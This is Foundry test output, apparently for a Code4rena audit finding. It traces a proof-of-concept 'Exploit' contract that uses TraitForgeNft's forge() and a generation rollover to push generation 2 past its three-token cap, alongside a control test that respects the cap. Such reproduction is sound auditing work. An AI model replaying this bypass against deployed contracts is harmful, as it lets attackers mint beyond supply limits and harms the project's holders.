@@ -1,0 +1,167 @@
+No files changed, compilation skipped
+
+Ran 2 tests for test/37918-h-04-generation-mint-count-reset-forged-token-cap-bypass-code4rena_exp.sol:GenerationCounterResetTest
+[PASS] test_control_withoutForgingRespectsCap() (gas: 583605)
+Traces:
+  [583605] GenerationCounterResetTest::test_control_withoutForgingRespectsCap()
+    ├─ [330533] → new TraitForgeNft@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 1
+    │   │   @ 1: 0 → 3
+    │   └─ ← [Return] 1430 bytes of code
+    ├─ [90121] TraitForgeNft::mintToken()
+    │   ├─  storage changes:
+    │   │   @ 0xabd6e7cb50984ff9c2f3e18a2660c3353dadf4e3291deeb275dae2cd1e44fe05: 0 → 1
+    │   │   @ 0x1471eb6eb2c5e789fc3de43f8ce62938c7d1836ec861730447e2ada8fd81017b: 0 → 1
+    │   │   @ 2: 0 → 1
+    │   │   @ 0xa15bc60c955c405d20d9149c709e2460f1c2d9a497496a7f46004d1772c3054c: 0 → 1
+    │   └─ ← [Return] 1
+    ├─ [24421] TraitForgeNft::mintToken()
+    │   ├─  storage changes:
+    │   │   @ 0x89832631fb3c3307a103ba2c84ab569c64d6182a18893dcd163f0f1c2090733a: 0 → 1
+    │   │   @ 0xa15bc60c955c405d20d9149c709e2460f1c2d9a497496a7f46004d1772c3054c: 1 → 2
+    │   │   @ 2: 1 → 2
+    │   │   @ 0xabd6e7cb50984ff9c2f3e18a2660c3353dadf4e3291deeb275dae2cd1e44fe05: 1 → 2
+    │   └─ ← [Return] 2
+    ├─ [27587] TraitForgeNft::mintToken()
+    │   ├─  storage changes:
+    │   │   @ 0xa9bc9a3a348c357ba16b37005d7e6b3236198c0e939f4af8c5f19b8deeb8ebc0: 0 → 1
+    │   │   @ 0xa15bc60c955c405d20d9149c709e2460f1c2d9a497496a7f46004d1772c3054c: 2 → 3
+    │   │   @ 0xabd6e7cb50984ff9c2f3e18a2660c3353dadf4e3291deeb275dae2cd1e44fe05: 2 → 3
+    │   │   @ 0: 1 → 2
+    │   │   @ 2: 2 → 3
+    │   └─ ← [Return] 3
+    ├─ [66221] TraitForgeNft::mintToken()
+    │   ├─  storage changes:
+    │   │   @ 0x3eec716f11ba9e820c81ca75eb978ffb45831ef8b7a53e5e422c26008e1ca6d5: 0 → 2
+    │   │   @ 0x91da3fd0782e51c6b3986e9e672fd566868e71f3dbc2d6c2cd6fbb3e361af2a7: 0 → 1
+    │   │   @ 2: 3 → 4
+    │   │   @ 0xc3a24b0501bd2c13a7e57f2db4369ec4c223447539fc0724a9d55ac4a06ebd4d: 0 → 1
+    │   └─ ← [Return] 4
+    ├─ [820] TraitForgeNft::generationEntityCounts(1) [staticcall]
+    │   └─ ← [Return] 3
+    ├─ [0] VM::assertEq(3, 3) [staticcall]
+    │   └─ ← [Return]
+    ├─ [820] TraitForgeNft::generationEntityCounts(2) [staticcall]
+    │   └─ ← [Return] 1
+    ├─ [0] VM::assertEq(1, 1) [staticcall]
+    │   └─ ← [Return]
+    ├─ [820] TraitForgeNft::generationEntityCounts(2) [staticcall]
+    │   └─ ← [Return] 1
+    ├─ [469] TraitForgeNft::maxTokensPerGen() [staticcall]
+    │   └─ ← [Return] 3
+    ├─ [0] VM::assertLe(1, 3) [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+[PASS] test_forgedEntityIsDroppedByGenerationRollover() (gas: 1568090)
+Traces:
+  [1587990] GenerationCounterResetTest::test_forgedEntityIsDroppedByGenerationRollover()
+    ├─ [1196081] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─ [330533] → new TraitForgeNft@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 1
+    │   │   │   @ 1: 0 → 3
+    │   │   └─ ← [Return] 1430 bytes of code
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   └─ ← [Return] 4051 bytes of code
+    ├─ [681] Exploit::nft() [staticcall]
+    │   └─ ← [Return] TraitForgeNft: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
+    ├─ [343355] Exploit::run()
+    │   ├─ [89744] TraitForgeNft::forge()
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x91da3fd0782e51c6b3986e9e672fd566868e71f3dbc2d6c2cd6fbb3e361af2a7: 0 → 1
+    │   │   │   @ 2: 0 → 1
+    │   │   │   @ 0x1471eb6eb2c5e789fc3de43f8ce62938c7d1836ec861730447e2ada8fd81017b: 0 → 2
+    │   │   │   @ 0xc3a24b0501bd2c13a7e57f2db4369ec4c223447539fc0724a9d55ac4a06ebd4d: 0 → 1
+    │   │   └─ ← [Return] 1
+    │   ├─ [799] TraitForgeNft::tokenGeneration(1) [staticcall]
+    │   │   └─ ← [Return] 2
+    │   ├─ [754] TraitForgeNft::generationMintCounts(2) [staticcall]
+    │   │   └─ ← [Return] 1
+    │   ├─ [68221] TraitForgeNft::mintToken()
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x89832631fb3c3307a103ba2c84ab569c64d6182a18893dcd163f0f1c2090733a: 0 → 1
+    │   │   │   @ 2: 1 → 2
+    │   │   │   @ 0xabd6e7cb50984ff9c2f3e18a2660c3353dadf4e3291deeb275dae2cd1e44fe05: 0 → 1
+    │   │   │   @ 0xa15bc60c955c405d20d9149c709e2460f1c2d9a497496a7f46004d1772c3054c: 0 → 1
+    │   │   └─ ← [Return] 2
+    │   ├─ [24421] TraitForgeNft::mintToken()
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xa9bc9a3a348c357ba16b37005d7e6b3236198c0e939f4af8c5f19b8deeb8ebc0: 0 → 1
+    │   │   │   @ 0xabd6e7cb50984ff9c2f3e18a2660c3353dadf4e3291deeb275dae2cd1e44fe05: 1 → 2
+    │   │   │   @ 0xa15bc60c955c405d20d9149c709e2460f1c2d9a497496a7f46004d1772c3054c: 1 → 2
+    │   │   │   @ 2: 2 → 3
+    │   │   └─ ← [Return] 3
+    │   ├─ [25487] TraitForgeNft::mintToken()
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xc3a24b0501bd2c13a7e57f2db4369ec4c223447539fc0724a9d55ac4a06ebd4d: 1 → 0
+    │   │   │   @ 0x3eec716f11ba9e820c81ca75eb978ffb45831ef8b7a53e5e422c26008e1ca6d5: 0 → 1
+    │   │   │   @ 2: 3 → 4
+    │   │   │   @ 0xa15bc60c955c405d20d9149c709e2460f1c2d9a497496a7f46004d1772c3054c: 2 → 3
+    │   │   │   @ 0xabd6e7cb50984ff9c2f3e18a2660c3353dadf4e3291deeb275dae2cd1e44fe05: 2 → 3
+    │   │   │   @ 0: 1 → 2
+    │   │   └─ ← [Return] 4
+    │   ├─ [491] TraitForgeNft::currentGeneration() [staticcall]
+    │   │   └─ ← [Return] 2
+    │   ├─ [754] TraitForgeNft::generationMintCounts(2) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [44321] TraitForgeNft::mintToken()
+    │   │   ├─  storage changes:
+    │   │   │   @ 2: 4 → 5
+    │   │   │   @ 0xc3a24b0501bd2c13a7e57f2db4369ec4c223447539fc0724a9d55ac4a06ebd4d: 0 → 1
+    │   │   │   @ 0x458b30c2d72bfd2c6317304a4594ecbafe5f729d3111b65fdc3a33bd48e5432d: 0 → 2
+    │   │   │   @ 0x91da3fd0782e51c6b3986e9e672fd566868e71f3dbc2d6c2cd6fbb3e361af2a7: 1 → 2
+    │   │   └─ ← [Return] 5
+    │   ├─ [24421] TraitForgeNft::mintToken()
+    │   │   ├─  storage changes:
+    │   │   │   @ 2: 5 → 6
+    │   │   │   @ 0x069400f22b28c6c362558d92f66163cec5671cba50b61abd2eecfcd0eaeac518: 0 → 2
+    │   │   │   @ 0x91da3fd0782e51c6b3986e9e672fd566868e71f3dbc2d6c2cd6fbb3e361af2a7: 2 → 3
+    │   │   │   @ 0xc3a24b0501bd2c13a7e57f2db4369ec4c223447539fc0724a9d55ac4a06ebd4d: 1 → 2
+    │   │   └─ ← [Return] 6
+    │   ├─ [27587] TraitForgeNft::mintToken()
+    │   │   ├─  storage changes:
+    │   │   │   @ 2: 6 → 7
+    │   │   │   @ 0xeddb6698d7c569ff62ff64f1f1492bf14a54594835ba0faac91f84b4f5d81460: 0 → 2
+    │   │   │   @ 0x91da3fd0782e51c6b3986e9e672fd566868e71f3dbc2d6c2cd6fbb3e361af2a7: 3 → 4
+    │   │   │   @ 0xc3a24b0501bd2c13a7e57f2db4369ec4c223447539fc0724a9d55ac4a06ebd4d: 2 → 3
+    │   │   │   @ 0: 2 → 3
+    │   │   └─ ← [Return] 7
+    │   ├─ [820] TraitForgeNft::generationEntityCounts(2) [staticcall]
+    │   │   └─ ← [Return] 4
+    │   ├─ [469] TraitForgeNft::maxTokensPerGen() [staticcall]
+    │   │   └─ ← [Return] 3
+    │   ├─ [820] TraitForgeNft::generationEntityCounts(2) [staticcall]
+    │   │   └─ ← [Return] 4
+    │   ├─ [799] TraitForgeNft::tokenGeneration(1) [staticcall]
+    │   │   └─ ← [Return] 2
+    │   ├─  storage changes:
+    │   │   @ 1: 0 → 1
+    │   └─ ← [Stop]
+    ├─ [491] TraitForgeNft::currentGeneration() [staticcall]
+    │   └─ ← [Return] 3
+    ├─ [0] VM::assertEq(3, 3, "rollover should leave generation 3 active") [staticcall]
+    │   └─ ← [Return]
+    ├─ [820] TraitForgeNft::generationEntityCounts(2) [staticcall]
+    │   └─ ← [Return] 4
+    ├─ [0] VM::assertEq(4, 4, "generation 2 must exceed its three-entity cap") [staticcall]
+    │   └─ ← [Return]
+    ├─ [820] TraitForgeNft::generationEntityCounts(2) [staticcall]
+    │   └─ ← [Return] 4
+    ├─ [469] TraitForgeNft::maxTokensPerGen() [staticcall]
+    │   └─ ← [Return] 3
+    ├─ [0] VM::assertGt(4, 3) [staticcall]
+    │   └─ ← [Return]
+    ├─ [403] Exploit::forgedToken() [staticcall]
+    │   └─ ← [Return] 1
+    ├─ [799] TraitForgeNft::tokenGeneration(1) [staticcall]
+    │   └─ ← [Return] 2
+    ├─ [0] VM::assertEq(2, 2) [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.04ms (1.11ms CPU time)
+
+Ran 1 test suite in 11.34ms (1.04ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
